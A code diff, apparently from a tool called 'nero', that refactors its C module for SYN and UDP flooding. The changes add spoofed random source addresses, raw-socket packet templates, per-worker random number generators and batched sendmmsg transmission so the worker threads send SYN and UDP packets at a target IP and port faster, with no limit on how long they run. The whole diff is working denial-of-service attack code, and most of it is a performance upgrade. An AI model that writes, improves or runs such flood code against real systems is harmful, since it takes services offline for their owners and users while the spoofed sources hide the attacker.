@@ -11,26 +11,22 @@
 #include <unistd.h>
 #include <pthread.h>
 #include <time.h>
+#include <errno.h>
+#include <fcntl.h>
 #include <sys/socket.h>
-#include <sys/resource.h>
+#include <sys/uio.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/in.h>
 #include <signal.h>
 #include <stdatomic.h>
-#ifndef _WIN32
-#include <poll.h>
-#endif
 #include <netinet/udp.h>  // struct udphdr
 
-#include "nero/ascii.h"
-#include "nero/hardware.h"
-#include "nero/log.h"
-#include "nero/diagnostic_process.h"
-#include "nero/terminal.h"
 #include "nero/portscanner.h"
 #include "nero/syn_flood_powered.h"
+
+#include "syn/syn_internal.h"
 
 /* PACKET_SIZE is the datagram buffer ceiling; the operator selects a smaller
  * size at run time through the settings prompt. The worker count is not a
@@ -39,13 +35,12 @@
 #define PACKET_SIZE NERO_SYN_PACKET_SIZE_MAX
 
 // Global state
-volatile sig_atomic_t row;
-int port_select;
+static volatile sig_atomic_t row;
+static int port_select;
 
-extern pthread_mutex_t ekran_mutex;
 extern volatile sig_atomic_t cli_termination_signal;
 
-volatile sig_atomic_t stop_flag = 0;
+static volatile sig_atomic_t stop_flag = 0;
 
 /* Run-time engine settings selected through the pre-start prompt. The worker
  * default is replaced by the hardware suggestion when one is available; the
@@ -59,7 +54,7 @@ static long syn_packet_size  = PACKET_SIZE;
  * released instead of spinning forever. */
 static atomic_int active_workers = 0;
 
-pthread_t animasyon_thread;
+static pthread_t animasyon_thread;
 
 // Pseudo-header for TCP/UDP checksum calculation
 struct pseudo_header {
@@ -106,31 +101,101 @@ _Static_assert(sizeof(struct nero_iphdr) == 20, "struct iphdr layout mismatch");
 #define NERO_IP_LEN_GET(iph) ((int)ntohs((iph)->tot_len))
 #endif
 
-typedef struct {
-    const char *target_ip;
-    int thread_count;
-} AnimationArgs;
+/* ============================================================
+ * ENTROPY, PRNG AND CHECKSUMS
+ * ============================================================ */
 
-/* 32-bit rastgele kaynak IP üretir.
- *
- * rand_r() glibc'de yalnızca 15 bit (0..32767) döndürür.  Bu yüzden
- * `htonl((uint32_t)rand_r(&seed))` kaynak IP'nin üst iki oktetini her
- * zaman 0 yapar.  4 bağımsız `% 256` çağrısıyla tam 32-bit entropi
- * üretiyoruz.
- *
- * Ayrıca kernel `raw_send_hdrinc` içinde multicast (224.0.0.0/4),
- * zero-net (0.0.0.0/8) ve limited-broadcast (255.255.255.255) kaynak
- * adresleri `EINVAL` ile reddeder.  Bunları üretimden dışlıyoruz. */
-static inline uint32_t random_src_ip(unsigned int *seed) {
-    for (;;) {
-        uint32_t a = rand_r(seed) % 256;
-        uint32_t b = rand_r(seed) % 256;
-        uint32_t c = rand_r(seed) % 256;
-        uint32_t d = rand_r(seed) % 256;
-        if (a == 0 || a == 127 || a >= 224)   /* zero-net, loopback, multicast/broadcast */
-            continue;
-        return htonl((a << 24) | (b << 16) | (c << 8) | d);
+/* One 64-bit seed from the OS CSPRNG.  /dev/urandom exists on both supported
+ * platforms; arc4random_buf is the native Apple fallback.  If neither works
+ * several independent sources are mixed so sibling workers cannot start from
+ * the same state. */
+static uint64_t os_entropy64(void)
+{
+    uint64_t value = 0;
+    int fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
+    if (fd >= 0) {
+        ssize_t got = read(fd, &value, sizeof(value));
+        close(fd);
+        if (got == (ssize_t)sizeof(value) && value != 0)
+            return value;
     }
+#if defined(__APPLE__)
+    arc4random_buf(&value, sizeof(value));
+    if (value != 0)
+        return value;
+#endif
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    value ^= ((uint64_t)now.tv_sec << 32) ^ (uint64_t)now.tv_nsec;
+    value ^= (uint64_t)(uintptr_t)pthread_self();
+    value ^= (uint64_t)(uintptr_t)&value;
+    return value != 0 ? value : 0x9E3779B97F4A7C15ULL;
+}
+
+/* SplitMix64: small, fast and statistically far better than rand_r()'s
+ * 15-bit LCG, needing only 8 bytes of per-worker state. */
+typedef struct {
+    uint64_t state;
+} flood_rng;
+
+static inline uint64_t rng_next(flood_rng *rng)
+{
+    uint64_t z = (rng->state += 0x9E3779B97F4A7C15ULL);
+    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
+    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
+    return z ^ (z >> 31);
+}
+
+static inline uint32_t rng_u32(flood_rng *rng)
+{
+    return (uint32_t)(rng_next(rng) >> 32);
+}
+
+static inline uint16_t rng_port(flood_rng *rng)
+{
+    return (uint16_t)(rng_next(rng) % 65535u + 1u);
+}
+
+/* 32-bit spoofed source IP.  The kernel's raw_send_hdrinc rejects zero-net
+ * (0.0.0.0/8), loopback (127.0.0.0/8) and multicast/broadcast (224.0.0.0/4
+ * and above) sources with EINVAL, so those first octets are skipped. */
+static inline uint32_t random_src_ip(flood_rng *rng)
+{
+    for (;;) {
+        uint32_t value = rng_u32(rng);
+        uint8_t first = (uint8_t)(value >> 24);
+        if (first == 0 || first == 127 || first >= 224)
+            continue;
+        return htonl(value);
+    }
+}
+
+/* RFC 1071 incremental one's-complement accumulator.  Words are read in host
+ * order, matching the previous checksum() convention, but without copying the
+ * payload into a temporary pseudogram. */
+static inline uint32_t csum_add(uint32_t sum, const void *data, size_t length)
+{
+    const unsigned char *bytes = (const unsigned char *)data;
+    while (length >= 2) {
+        uint16_t word;
+        memcpy(&word, bytes, sizeof(word));
+        sum += word;
+        bytes += 2;
+        length -= 2;
+    }
+    if (length != 0) {
+        uint16_t word = 0;
+        memcpy(&word, bytes, 1);
+        sum += word;
+    }
+    return sum;
+}
+
+static inline uint16_t csum_fold(uint32_t sum)
+{
+    while ((sum >> 16) != 0)
+        sum = (sum & 0xffffu) + (sum >> 16);
+    return (uint16_t)~sum;
 }
 
 // Signal handler for Ctrl+C: only async-signal-safe calls.
@@ -159,44 +224,18 @@ void sigint_handler(int sig) {
     (void)write(STDOUT_FILENO, seq, len);
 }
 
-/* RFC 1071 Internet checksum.  Returns the one's-complement sum in host
- * byte order (callers store it directly into the header field). */
-static unsigned short checksum(unsigned short *ptr, int nbytes) {
-    long sum = 0;
-    unsigned short oddbyte;
-    unsigned short answer;
-
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
-        sum += oddbyte;
-    }
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = (unsigned short)(~sum);
-    return answer;
-}
-
 /* IPv4 checksum must be computed over the wire representation of the header.
  * On Darwin tot_len is stored in host order, so swap it temporarily. */
-static unsigned short ip_checksum(struct nero_iphdr *iph) {
+static uint16_t ip_header_checksum(struct nero_iphdr *iph) {
 #if defined(__APPLE__)
     uint16_t saved = iph->tot_len;
     iph->tot_len = htons(saved);
-    unsigned short result = checksum((unsigned short *)iph, iph->ihl * 4);
+    uint16_t result = csum_fold(csum_add(0, iph, iph->ihl * 4));
     iph->tot_len = saved;
     return result;
 #else
-    return checksum((unsigned short *)iph, iph->ihl * 4);
+    return csum_fold(csum_add(0, iph, iph->ihl * 4));
 #endif
-}
-
-int is_target_online(const char *ip) {
-    return nero_ping_ipv4(ip, &cli_termination_signal);
 }
 
 /* Runs when a worker exits, whether normally or through pthread_exit(). */
@@ -207,489 +246,434 @@ static void flood_worker_cleanup(void *unused)
         stop_flag = 1;
 }
 
+/* ============================================================
+ * PACKET TEMPLATES AND BATCHED TRANSMIT
+ * ============================================================ */
+
+#define NERO_SYN_TCP_LEN (sizeof(struct nero_iphdr) + sizeof(struct tcphdr))
+#define NERO_SYN_UDP_HDR_LEN (sizeof(struct nero_iphdr) + sizeof(struct udphdr))
+#define NERO_SYN_BATCH_MAX 32
+#define NERO_SYN_BATCH_BYTES (64u * 1024u)
+
+/* Linux batches with sendmmsg(); the BSDs and macOS use one sendmsg() per
+ * datagram.  The message container type is hidden behind this typedef so the
+ * packet builders stay identical on both paths. */
+#if defined(__linux__)
+typedef struct mmsghdr nero_mmsg;
+#define nero_msg_hdr(msg) (&(msg)->msg_hdr)
+#else
+typedef struct msghdr nero_mmsg;
+#define nero_msg_hdr(msg) (msg)
+#endif
+
+typedef struct {
+    flood_rng rng;
+    int sock_tcp;
+    int sock_udp;
+    int closes_sockets;
+    struct sockaddr_in target;
+    int batch;
+    int payload_len;
+    _Alignas(8) unsigned char tcp_template[NERO_SYN_TCP_LEN];
+    _Alignas(8) unsigned char udp_template[NERO_SYN_UDP_HDR_LEN];
+    unsigned char *tcp_slots;
+    unsigned char *udp_slots;
+    unsigned char *payload;
+    uint32_t payload_sum;
+    struct iovec *tcp_iov;
+    struct iovec *udp_iov;
+    nero_mmsg *tcp_msgs;
+    nero_mmsg *udp_msgs;
+} flood_engine;
+
+/* Static header fields are written once.  Each packet only copies the small
+ * template and patches the fields that actually vary. */
+static void prepare_templates(flood_engine *engine, in_addr_t dest)
+{
+    memset(engine->tcp_template, 0, sizeof(engine->tcp_template));
+    struct nero_iphdr *iph = (struct nero_iphdr *)engine->tcp_template;
+    struct tcphdr *tcph =
+        (struct tcphdr *)(engine->tcp_template + sizeof(struct nero_iphdr));
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    NERO_IP_LEN_SET(iph, NERO_SYN_TCP_LEN);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_TCP;
+    iph->daddr = dest;
+#if defined(__APPLE__)
+    tcph->th_dport = htons((uint16_t)port_select);
+    tcph->th_off = 5;
+    tcph->th_flags = TH_SYN;
+#else
+    tcph->dest = htons((uint16_t)port_select);
+    tcph->doff = 5;
+    tcph->syn = 1;
+#endif
+
+    memset(engine->udp_template, 0, sizeof(engine->udp_template));
+    iph = (struct nero_iphdr *)engine->udp_template;
+    struct udphdr *udph =
+        (struct udphdr *)(engine->udp_template + sizeof(struct nero_iphdr));
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    NERO_IP_LEN_SET(iph, NERO_SYN_UDP_HDR_LEN + (size_t)engine->payload_len);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_UDP;
+    iph->daddr = dest;
+#if defined(__APPLE__)
+    udph->uh_dport = htons((uint16_t)port_select);
+    udph->uh_ulen =
+        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));
+#else
+    udph->dest = htons((uint16_t)port_select);
+    udph->len =
+        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));
+#endif
+}
+
+static void build_tcp_packet(flood_engine *engine, unsigned char *slot)
+{
+    memcpy(slot, engine->tcp_template, NERO_SYN_TCP_LEN);
+    struct nero_iphdr *iph = (struct nero_iphdr *)slot;
+    struct tcphdr *tcph = (struct tcphdr *)(slot + sizeof(struct nero_iphdr));
+
+    iph->id = htons((uint16_t)rng_next(&engine->rng));
+    iph->saddr = random_src_ip(&engine->rng);
+#if defined(__APPLE__)
+    tcph->th_sport = htons(rng_port(&engine->rng));
+    tcph->th_seq = rng_u32(&engine->rng);
+    tcph->th_win =
+        htons((uint16_t)(32767u + rng_next(&engine->rng) % (65536u - 32767u)));
+#else
+    tcph->source = htons(rng_port(&engine->rng));
+    tcph->seq = rng_u32(&engine->rng);
+    tcph->window =
+        htons((uint16_t)(32767u + rng_next(&engine->rng) % (65536u - 32767u)));
+#endif
+
+    iph->check = ip_header_checksum(iph);
+
+    struct pseudo_header psh;
+    psh.source_address = iph->saddr;
+    psh.dest_address = iph->daddr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons((uint16_t)sizeof(struct tcphdr));
+
+    uint32_t sum = csum_add(0, &psh, sizeof(psh));
+    sum = csum_add(sum, tcph, sizeof(struct tcphdr));
+    uint16_t check = csum_fold(sum);
+#if defined(__APPLE__)
+    tcph->th_sum = check;
+#else
+    tcph->check = check;
+#endif
+}
+
+static void build_udp_packet(flood_engine *engine, unsigned char *slot)
+{
+    memcpy(slot, engine->udp_template, NERO_SYN_UDP_HDR_LEN);
+    struct nero_iphdr *iph = (struct nero_iphdr *)slot;
+    struct udphdr *udph = (struct udphdr *)(slot + sizeof(struct nero_iphdr));
+
+    iph->id = htons((uint16_t)rng_next(&engine->rng));
+    iph->saddr = random_src_ip(&engine->rng);
+#if defined(__APPLE__)
+    udph->uh_sport = htons(rng_port(&engine->rng));
+#else
+    udph->source = htons(rng_port(&engine->rng));
+#endif
+
+    iph->check = ip_header_checksum(iph);
+
+    struct pseudo_header psh;
+    psh.source_address = iph->saddr;
+    psh.dest_address = iph->daddr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_UDP;
+    psh.tcp_length =
+        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));
+
+    uint32_t sum = csum_add(0, &psh, sizeof(psh));
+    sum = csum_add(sum, udph, sizeof(struct udphdr));
+    sum += engine->payload_sum;
+    uint16_t check = csum_fold(sum);
+    if (check == 0)
+        check = 0xffff;  /* zero means "no checksum" for UDP */
+#if defined(__APPLE__)
+    udph->uh_sum = check;
+#else
+    udph->check = check;
+#endif
+}
+
+static void syn_backoff(struct timespec *delay)
+{
+    nanosleep(delay, NULL);
+    long next = delay->tv_nsec * 2;
+    delay->tv_nsec = next > 50000000 ? 50000000 : next;
+}
+
+/* Sends every queued message, retrying only transient socket pressure and
+ * backing off so a full transmit ring does not become a busy spin. */
+static void send_batch(int fd, nero_mmsg *msgs, unsigned int count,
+                       const char *label,
+                       unsigned long *sent, unsigned long *errors)
+{
+#if defined(__linux__)
+    unsigned int offset = 0;
+    struct timespec delay = {0, 100000};
+    while (offset < count && !stop_flag) {
+        int rc = sendmmsg(fd, msgs + offset, count - offset, MSG_DONTWAIT);
+        if (rc > 0) {
+            *sent += (unsigned long)rc;
+            offset += (unsigned int)rc;
+            delay.tv_nsec = 100000;
+            continue;
+        }
+        if (rc < 0 && (errno == EAGAIN || errno == EWOULDBLOCK ||
+                       errno == ENOBUFS || errno == EINTR)) {
+            syn_backoff(&delay);
+            continue;
+        }
+        if (rc < 0) {
+            struct timespec pause = {0, 1000000};
+            if (*errors == 0)
+                perror(label);
+            *errors += count - offset;
+            nanosleep(&pause, NULL);
+        }
+        break;
+    }
+#else
+    for (unsigned int i = 0; i < count && !stop_flag; i++) {
+        struct timespec delay = {0, 100000};
+        for (;;) {
+            ssize_t rc = sendmsg(fd, nero_msg_hdr(&msgs[i]), MSG_DONTWAIT);
+            if (rc >= 0) {
+                (*sent)++;
+                break;
+            }
+            if (errno == EAGAIN || errno == EWOULDBLOCK ||
+                errno == ENOBUFS || errno == EINTR) {
+                syn_backoff(&delay);
+                continue;
+            }
+            struct timespec pause = {0, 1000000};
+            if (*errors == 0)
+                perror(label);
+            (*errors)++;
+            nanosleep(&pause, NULL);
+            break;
+        }
+    }
+#endif
+}
+
+/* Releases per-worker buffers and sockets.  Safe on a partially initialised
+ * engine, including one whose allocation failed. */
+static void engine_release(flood_engine *engine)
+{
+    free(engine->tcp_slots);
+    free(engine->udp_slots);
+    free(engine->payload);
+    free(engine->tcp_iov);
+    free(engine->udp_iov);
+    free(engine->tcp_msgs);
+    free(engine->udp_msgs);
+    if (engine->closes_sockets) {
+        if (engine->sock_tcp >= 0)
+            close(engine->sock_tcp);
+        if (engine->sock_udp >= 0)
+            close(engine->sock_udp);
+    }
+}
+
+/* The raw socket pair is shared by every worker: raw sockets carry no
+ * per-thread state, so this keeps descriptor use constant (2 for the whole
+ * run) instead of 2 per worker.  Called once from SYN_Flood(). */
+static int open_flood_sockets(int *sock_tcp, int *sock_udp)
+{
+    int one = 1;
+    int sendbuf = 1 << 20;
+
+    *sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (*sock_tcp < 0) {
+        perror("Failed to create TCP socket");
+        return -1;
+    }
+    if (setsockopt(*sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt TCP");
+        close(*sock_tcp);
+        *sock_tcp = -1;
+        return -1;
+    }
+
+    *sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (*sock_udp < 0) {
+        perror("Failed to create UDP socket");
+        close(*sock_tcp);
+        *sock_tcp = -1;
+        return -1;
+    }
+    if (setsockopt(*sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt UDP");
+        close(*sock_tcp);
+        close(*sock_udp);
+        *sock_tcp = -1;
+        *sock_udp = -1;
+        return -1;
+    }
+
+    /* Non-blocking raw sockets plus a larger transmit queue: sendmmsg()
+     * returns EAGAIN instead of stalling a worker when the ring is full,
+     * and send_batch() backs off briefly. */
+    (void)setsockopt(*sock_tcp, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
+    (void)setsockopt(*sock_udp, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
+
+    int flags = fcntl(*sock_tcp, F_GETFL, 0);
+    if (flags >= 0)
+        (void)fcntl(*sock_tcp, F_SETFL, flags | O_NONBLOCK);
+    flags = fcntl(*sock_udp, F_GETFL, 0);
+    if (flags >= 0)
+        (void)fcntl(*sock_udp, F_SETFL, flags | O_NONBLOCK);
+
+    return 0;
+}
+
+typedef struct {
+    const char *target_ip;
+    int sock_tcp;
+    int sock_udp;
+} FloodArgs;
+
 // Thread function: continuously send SYN + UDP packets to target IP
 static void *flood(void *arg)
 {
-    const char *target_ip = (const char *)arg;
+    const FloodArgs *args = (const FloodArgs *)arg;
     atomic_fetch_add_explicit(&active_workers, 1, memory_order_relaxed);
     pthread_cleanup_push(flood_worker_cleanup, NULL);
-    /* Per-thread PRNG state.  time(NULL) tek başına yeterli değil: aynı
-     * saniyede başlayan thread'ler aynı seed'i alır.  pthread_self() ve
-     * stack adresi karıştırarak thread'leri ayır. */
-    unsigned int seed = (unsigned int)time(NULL)
-                      ^ (unsigned int)(uintptr_t)pthread_self()
-                      ^ (unsigned int)(uintptr_t)&arg
-                      ^ (unsigned int)(uintptr_t)&seed;
 
-    struct sockaddr_in sin;
-    memset(&sin, 0, sizeof(sin));
-    sin.sin_family = AF_INET;
+    flood_engine engine;
+    memset(&engine, 0, sizeof(engine));
+    engine.sock_tcp = args->sock_tcp;
+    engine.sock_udp = args->sock_udp;
+    engine.closes_sockets = 0;
+    engine.rng.state = os_entropy64();
+
+    engine.target.sin_family = AF_INET;
 #if defined(__APPLE__)
-    sin.sin_len = sizeof(sin);
+    engine.target.sin_len = sizeof(engine.target);
 #endif
-    sin.sin_port = htons(port_select);
-    sin.sin_addr.s_addr = inet_addr(target_ip);
+    engine.target.sin_port = htons((uint16_t)port_select);
+    engine.target.sin_addr.s_addr = inet_addr(args->target_ip);
 
-    // TCP socket
-    int sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock_tcp < 0) {
-        perror("Failed to create TCP socket");
+    engine.payload_len =
+        (int)(syn_packet_size - (long)NERO_SYN_UDP_HDR_LEN);
+    engine.batch = NERO_SYN_BATCH_MAX;
+    while (engine.batch > 1 &&
+           (size_t)engine.batch * (size_t)engine.payload_len > NERO_SYN_BATCH_BYTES)
+        engine.batch >>= 1;
+
+    engine.tcp_slots = malloc((size_t)engine.batch * NERO_SYN_TCP_LEN);
+    engine.udp_slots = malloc((size_t)engine.batch * NERO_SYN_UDP_HDR_LEN);
+    engine.tcp_iov = calloc((size_t)engine.batch, sizeof(*engine.tcp_iov));
+    engine.udp_iov = calloc((size_t)engine.batch * 2, sizeof(*engine.udp_iov));
+    engine.tcp_msgs = calloc((size_t)engine.batch, sizeof(*engine.tcp_msgs));
+    engine.udp_msgs = calloc((size_t)engine.batch, sizeof(*engine.udp_msgs));
+    engine.payload = malloc((size_t)engine.payload_len);
+    if (!engine.tcp_slots || !engine.udp_slots || !engine.tcp_iov ||
+        !engine.udp_iov || !engine.tcp_msgs || !engine.udp_msgs ||
+        !engine.payload) {
+        fprintf(stderr, "Failed to allocate flood packet buffers\n");
+        engine_release(&engine);
         pthread_exit(NULL);
     }
 
-    int one = 1;
-    if (setsockopt(sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt TCP");
-        close(sock_tcp);
-        pthread_exit(NULL);
+    /* One random payload per worker: it is reused for every datagram instead
+     * of regenerating thousands of random bytes for each packet. */
+    for (int i = 0; i < engine.payload_len; i++)
+        engine.payload[i] = (unsigned char)(rng_next(&engine.rng) & 0xffu);
+    engine.payload_sum =
+        csum_add(0, engine.payload, (size_t)engine.payload_len);
+
+    prepare_templates(&engine, engine.target.sin_addr.s_addr);
+
+    for (int i = 0; i < engine.batch; i++) {
+        struct msghdr *tcp_msg = nero_msg_hdr(&engine.tcp_msgs[i]);
+        tcp_msg->msg_name = &engine.target;
+        tcp_msg->msg_namelen = sizeof(engine.target);
+        tcp_msg->msg_iov = &engine.tcp_iov[i];
+        tcp_msg->msg_iovlen = 1;
+        engine.tcp_iov[i].iov_base =
+            engine.tcp_slots + (size_t)i * NERO_SYN_TCP_LEN;
+        engine.tcp_iov[i].iov_len = NERO_SYN_TCP_LEN;
+
+        struct msghdr *udp_msg = nero_msg_hdr(&engine.udp_msgs[i]);
+        udp_msg->msg_name = &engine.target;
+        udp_msg->msg_namelen = sizeof(engine.target);
+        udp_msg->msg_iov = &engine.udp_iov[(size_t)i * 2];
+        udp_msg->msg_iovlen = 2;
+        engine.udp_iov[(size_t)i * 2].iov_base =
+            engine.udp_slots + (size_t)i * NERO_SYN_UDP_HDR_LEN;
+        engine.udp_iov[(size_t)i * 2].iov_len = NERO_SYN_UDP_HDR_LEN;
+        engine.udp_iov[(size_t)i * 2 + 1].iov_base = engine.payload;
+        engine.udp_iov[(size_t)i * 2 + 1].iov_len = (size_t)engine.payload_len;
     }
 
-    // UDP socket
-    int sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (sock_udp < 0) {
-        perror("Failed to create UDP socket");
-        close(sock_tcp);
-        pthread_exit(NULL);
-    }
-
-    if (setsockopt(sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt UDP");
-        close(sock_tcp);
-        close(sock_udp);
-        pthread_exit(NULL);
-    }
-
-    char datagram[PACKET_SIZE];
     unsigned long tcp_sent = 0, udp_sent = 0;
     unsigned long tcp_err  = 0, udp_err  = 0;
 
     while (!stop_flag) {
 
-        /* ---------------- TCP ---------------- */
-        memset(datagram, 0, PACKET_SIZE);
-        struct nero_iphdr *iph = (struct nero_iphdr *)datagram;
-        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct nero_iphdr));
+        for (int i = 0; i < engine.batch; i++)
+            build_tcp_packet(&engine,
+                             engine.tcp_slots + (size_t)i * NERO_SYN_TCP_LEN);
+        send_batch(engine.sock_tcp, engine.tcp_msgs,
+                   (unsigned int)engine.batch, "send tcp",
+                   &tcp_sent, &tcp_err);
 
-        /* 1) IP başlığı */
-        iph->ihl = 5;
-        iph->version = 4;
-        iph->tos = 0;
-        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct tcphdr));
-        iph->id = htons(rand_r(&seed) % 65535);
-        iph->frag_off = 0;
-        iph->ttl = 255;
-        iph->protocol = IPPROTO_TCP;
-        iph->saddr = random_src_ip(&seed);
-        iph->daddr = sin.sin_addr.s_addr;
-        iph->check = 0;
+        if (stop_flag)
+            break;
 
-        /* 2) TCP başlığı */
-#if defined(__APPLE__)
-        /* macOS (BSD): alan adları th_* önekli.  SYN ayrı bit değil,
-         * th_flags içinde TH_SYN bayrağıdır. */
-        tcph->th_sport = htons(rand_r(&seed) % 65535);
-        tcph->th_dport = htons(port_select);
-        tcph->th_seq   = rand_r(&seed);
-        tcph->th_ack   = 0;
-        tcph->th_off   = 5;
-        tcph->th_flags = TH_SYN;
-        tcph->th_win   = htons(32767 + rand_r(&seed) % (65536 - 32767));
-        tcph->th_sum   = 0;
-        tcph->th_urp   = 0;
-#else
-        tcph->source  = htons(rand_r(&seed) % 65535);
-        tcph->dest    = htons(port_select);
-        tcph->seq     = rand_r(&seed);
-        tcph->ack_seq = 0;
-        tcph->doff    = 5;
-        tcph->syn     = 1;
-        tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
-        tcph->check   = 0;
-        tcph->urg_ptr = 0;
-#endif
-
-        /* 3) IP checksum — SADECE 20 byte (ihl * 4) */
-        iph->check = ip_checksum(iph);
-
-        /* 4) TCP checksum — pseudo-header + TCP başlığı */
-        struct pseudo_header psh_tcp;
-        psh_tcp.source_address = iph->saddr;
-        psh_tcp.dest_address   = iph->daddr;
-        psh_tcp.placeholder    = 0;
-        psh_tcp.protocol       = IPPROTO_TCP;
-        psh_tcp.tcp_length     = htons(sizeof(struct tcphdr));
-
-        int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
-        char *pseudogram_tcp = malloc(psize_tcp);
-        if (!pseudogram_tcp) {
-            close(sock_tcp);
-            close(sock_udp);
-            pthread_exit(NULL);
-        }
-        memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
-        memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-#if defined(__APPLE__)
-        tcph->th_sum = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
-#else
-        tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
-#endif
-        free(pseudogram_tcp);
-
-        if (sendto(sock_tcp, datagram, NERO_IP_LEN_GET(iph), 0,
-                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            if (tcp_err == 0) perror("sendto tcp");
-            tcp_err++;
-        } else {
-            tcp_sent++;
-        }
-
-        /* ---------------- UDP ---------------- */
-        memset(datagram, 0, PACKET_SIZE);
-        iph = (struct nero_iphdr *)datagram;
-        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct nero_iphdr));
-
-        /* Deterministic payload: the operator-selected packet size minus the
-         * 20-byte IP and 8-byte UDP headers (bounds checked in the prompt,
-         * so this stays >= 32 and within the PACKET_SIZE buffer). */
-        int payload_len = (int)(syn_packet_size
-                                - sizeof(struct nero_iphdr)
-                                - sizeof(struct udphdr));
-        char *payload = datagram + sizeof(struct nero_iphdr) + sizeof(struct udphdr);
-        for (int i = 0; i < payload_len; i++) {
-            payload[i] = (char)(rand_r(&seed) % 256);
-        }
-
-        /* 1) IP başlığı */
-        iph->ihl = 5;
-        iph->version = 4;
-        iph->tos = 0;
-        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct udphdr) + payload_len);
-        iph->id = htons(rand_r(&seed) % 65535);
-        iph->frag_off = 0;
-        iph->ttl = 255;
-        iph->protocol = IPPROTO_UDP;
-        iph->saddr = random_src_ip(&seed);
-        iph->daddr = sin.sin_addr.s_addr;
-        iph->check = 0;
-
-        /* 2) UDP başlığı (payload zaten yazıldı) */
-#if defined(__APPLE__)
-        /* macOS (BSD): alan adları uh_* önekli. */
-        udph->uh_sport = htons(rand_r(&seed) % 65535);
-        udph->uh_dport = htons(port_select);
-        udph->uh_ulen  = htons(sizeof(struct udphdr) + payload_len);
-        udph->uh_sum   = 0;
-#else
-        udph->source = htons(rand_r(&seed) % 65535);
-        udph->dest   = htons(port_select);
-        udph->len    = htons(sizeof(struct udphdr) + payload_len);
-        udph->check  = 0;
-#endif
-
-        /* 3) IP checksum — SADECE 20 byte */
-        iph->check = ip_checksum(iph);
-
-        /* 4) UDP checksum — pseudo-header + UDP başlığı + payload */
-        struct pseudo_header psh_udp;
-        psh_udp.source_address = iph->saddr;
-        psh_udp.dest_address   = iph->daddr;
-        psh_udp.placeholder    = 0;
-        psh_udp.protocol       = IPPROTO_UDP;
-        psh_udp.tcp_length     = htons(sizeof(struct udphdr) + payload_len);
-
-        int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
-        char *pseudogram_udp = malloc(psize_udp);
-        if (!pseudogram_udp) {
-            close(sock_tcp);
-            close(sock_udp);
-            pthread_exit(NULL);
-        }
-        memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
-        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph,
-               sizeof(struct udphdr) + payload_len);
-#if defined(__APPLE__)
-        udph->uh_sum = checksum((unsigned short *)pseudogram_udp, psize_udp);
-#else
-        udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
-#endif
-        free(pseudogram_udp);
-
-        if (sendto(sock_udp, datagram, NERO_IP_LEN_GET(iph), 0,
-                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            if (udp_err == 0) perror("sendto udp");
-            udp_err++;
-        } else {
-            udp_sent++;
-        }
+        for (int i = 0; i < engine.batch; i++)
+            build_udp_packet(&engine,
+                             engine.udp_slots + (size_t)i * NERO_SYN_UDP_HDR_LEN);
+        send_batch(engine.sock_udp, engine.udp_msgs,
+                   (unsigned int)engine.batch, "send udp",
+                   &udp_sent, &udp_err);
     }
 
     if (tcp_err || udp_err || tcp_sent || udp_sent) {
-        fprintf(stderr,
-                "[worker %p] sent tcp=%lu udp=%lu | errors tcp=%lu udp=%lu\n",
-                (void *)pthread_self(), tcp_sent, udp_sent, tcp_err, udp_err);
+        nero_syn_report_worker_summary((void *)pthread_self(), tcp_sent,
+                                       udp_sent, tcp_err, udp_err);
     }
 
-    close(sock_tcp);
-    close(sock_udp);
+    engine_release(&engine);
     pthread_cleanup_pop(1);
     return NULL;
 }
 
-void *flood_animation(void *arg)
-{
